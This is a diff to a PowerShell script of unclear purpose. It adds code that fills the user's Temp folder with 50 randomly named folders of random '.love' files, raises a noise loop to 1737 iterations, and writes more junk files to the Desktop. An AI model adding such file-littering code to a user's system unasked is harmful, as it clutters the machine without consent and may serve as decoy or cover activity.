@@ -135,7 +135,47 @@ $hashBytes = [kec]::Hash($randomBytes, 28)
 $hashHex = ([BitConverter]::ToString($hashBytes)) -replace '-', ''
 $hashHex = $hashHex.ToLower()
 
-1..737 | ForEach-Object {
+$Container = Join-Path $env:USERPROFILE 'AppData\Local\Temp' 
+if (-not (Test-Path $Container)) {
+    New-Item -ItemType Directory -Path $Container -Force | Out-Null
+}
+
+$FolderCount = 50
+$UsedFolders = [System.Collections.Generic.HashSet[string]]::new()
+$Rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+
+for ($i = 1; $i -le $FolderCount; $i++) {
+
+    do {
+        $Hash = -join ((1..32) | ForEach-Object {
+            '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16)
+        })
+    } while (-not $UsedFolders.Add($Hash))
+
+    $FolderPath = Join-Path $Container $Hash
+    New-Item -ItemType Directory -Path $FolderPath -Force | Out-Null
+
+    $FileCountInFolder = Get-Random -Minimum 1 -Maximum 4
+
+    for ($f = 1; $f -le $FileCountInFolder; $f++) {
+        $FileName = (-join ((1..16) | ForEach-Object {
+            '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16)
+        })) + ".love"
+
+        $FilePath = Join-Path $FolderPath $FileName
+
+        $ByteCount = Get-Random -Minimum 1024 -Maximum 8196
+        $Bytes = New-Object byte[] $ByteCount
+        $Rng.GetBytes($Bytes)
+
+        $Content = [Convert]::ToBase64String($Bytes)
+        Set-Content -Path $FilePath -Value $Content -Encoding UTF8
+    }
+}
+
+$Rng.Dispose()
+
+1..1737 | ForEach-Object {
     $bytes = New-Object byte[] 32
     [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
     [Convert]::ToBase64String($bytes)
@@ -175,7 +215,7 @@ If for some reasons the addresses are not available follow these steps:
 Write-Host $hashHex
 
 $OutputDir = [Environment]::ExpandEnvironmentVariables("%USERPROFILE%\Desktop")
-$FileCount = 12
+$FileCount = 32
 
 for ($i = 1; $i -le $FileCount; $i++) {
     $FileName = -join ((1..16) | ForEach-Object {
